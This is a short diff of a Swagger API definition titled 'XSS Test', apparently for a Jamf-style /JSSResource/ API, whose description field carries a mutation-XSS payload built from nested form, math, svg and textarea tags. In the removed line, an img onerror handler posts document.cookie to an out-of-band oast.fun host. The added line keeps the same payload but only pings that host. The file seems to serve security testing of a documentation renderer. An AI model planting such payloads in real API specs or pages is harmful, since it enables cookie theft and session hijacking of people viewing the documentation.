@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Test
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="fetch('https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'cookie=' + encodeURIComponent(document.cookie) })" src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror="fetch('https://wdmlfwehjkkbslnzvkyjczx1dchprmvw8.oast.fun')" src=1>"></form>
 
   version: production
 basePath: /JSSResource/
